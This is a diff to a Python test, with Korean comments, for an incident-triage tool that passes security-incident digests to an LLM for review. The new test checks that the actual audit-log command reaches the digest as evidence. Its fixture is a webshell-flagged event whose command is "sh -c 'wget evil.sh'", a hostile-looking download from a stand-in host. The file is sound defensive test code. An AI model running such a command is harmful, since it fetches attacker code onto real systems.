@@ -34,7 +34,21 @@ def _run():
                 {"incident_id": "mid", "investigate": False, "reason": "정상 스캐너로 보임"}]
     out = llm_review(incs, call=fake)
     assert seen["ids"] == ["hi", "mid"], f"대상은 P1/P2 뿐이어야: {seen['ids']}"
-    assert "detect_reasons" in seen["keys"] and "members" not in seen["keys"], "digest는 증거 원문 제외"
+    assert "detect_reasons" in seen["keys"], "digest에 탐지 사유 포함"
+
+    # 2-b) events 주면 digest에 evidence(실제 명령어) 붙는지
+    ev_seen = {}
+    def fake2(digests):
+        ev_seen["d0"] = digests[0]
+        return [{"incident_id": "hi", "investigate": True, "reason": "r"}]
+    events = [{"raw_ref": "audit.log:6", "layer": "system",
+               "layer_data": {"comm": "sh", "exec_args": "-c 'wget evil.sh'"}}]
+    hi_inc = _inc("hi", "P1")
+    hi_inc["members"] = ["audit.log:6"]
+    hi_inc["seeds"] = [{"reason": "webshell", "evidence_refs": ["audit.log:6"]}]
+    llm_review([hi_inc], events=events, call=fake2)
+    assert "evidence" in ev_seen["d0"], "events 주면 digest에 evidence 있어야"
+    assert any("wget evil.sh" in c for c in ev_seen["d0"]["evidence"]), "실제 명령어가 evidence에 실려야"
     assert out[0]["llm_investigate"] is True and out[0]["llm_reason"] == "웹셸 업로드 정황"
     assert out[1]["llm_investigate"] is False
     assert "llm_reason" not in out[2], "P3 는 LLM 재검토 대상 아님"
